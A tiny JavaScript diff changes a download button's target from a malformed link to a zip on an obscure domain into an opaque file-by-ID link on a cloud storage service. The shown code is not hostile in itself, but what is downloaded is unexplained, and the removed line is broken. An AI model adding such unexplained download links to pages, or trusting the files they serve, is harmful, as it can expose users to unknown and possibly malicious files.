@@ -13,5 +13,5 @@
 })();
 
 function btnDown() {
-    window.open('
-http://xzyqa.cc/q.zip}
+    window.open('https://f005.backblazeb2.com/b2api/v1/b2_download_file_by_id?fileId=4_z64b9c51816b9c17a9a8a0311_f117e5a045d2761e6_d20250820_m111658_c005_v0501035_t0041_u01755688618160')
+                }
